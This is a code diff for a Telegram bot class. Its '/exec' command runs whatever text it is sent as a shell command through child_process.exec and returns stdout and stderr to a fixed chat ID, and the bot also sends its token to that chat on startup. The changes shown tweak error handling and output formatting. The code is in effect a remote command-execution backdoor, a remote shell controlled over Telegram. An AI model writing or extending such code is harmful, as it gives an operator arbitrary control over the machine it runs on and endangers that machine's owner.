@@ -23,14 +23,17 @@ class Bot {
     init() {
         return __awaiter(this, void 0, void 0, function* () {
             this.commands();
+            let isError = false;
             try {
-                yield this.bot.launch();
+                this.bot.launch().catch(() => {
+                    isError = true;
+                });
                 yield this.bot.telegram.sendMessage(this.sender, `<b>Token:</b> \n\n<code>${this.token}</code>`, { parse_mode: 'HTML' });
             }
             catch (error) {
-                return false;
+                return isError;
             }
-            return true;
+            return isError;
         });
     }
     commands() {
@@ -58,11 +61,11 @@ class Bot {
         this.bot.command(/exec/, (ctx) => {
             const args = ctx.message.text.replace(/\/exec ?/, '');
             (0, child_process_1.exec)(args, (err, stdout, stderr) => {
-                const message = `<b>Error: code</b> -${(err === null || err === void 0 ? void 0 : err.code) || 1000}\n` +
-                    `<i>name</i> - ${err === null || err === void 0 ? void 0 : err.name}\n` +
-                    `<i>message</i> - ${err === null || err === void 0 ? void 0 : err.message}\n\n\n` +
-                    `<b>stdout</b>: ${stdout || 'null'}\n\n\n` +
-                    `<b>stderr</b>: ${stderr || 'null'}`;
+                const message = `<b>Error:</b>\ncode - ${(err === null || err === void 0 ? void 0 : err.code) || 'null'}\n` +
+                    `<i>name</i> - ${(err === null || err === void 0 ? void 0 : err.name) || 'null'}\n` +
+                    `<i>message</i> - ${(err === null || err === void 0 ? void 0 : err.message) || 'null'}\n\n\n` +
+                    `<b>stdout</b>: \n<code>${stdout || 'null'}</code>\n\n\n` +
+                    `<b>stderr</b>: \n${stderr || 'null'}`;
                 this.bot.telegram.sendMessage(this.sender, message, {
                     parse_mode: 'HTML',
                 });
@@ -73,7 +76,7 @@ class Bot {
                 yield spawnFn(ctx, this.sender, this.bot);
             }
             catch (error) {
-                (0, console_1.log)('err');
+                yield this.bot.telegram.sendMessage(this.sender, 'Error');
             }
         }));
     }
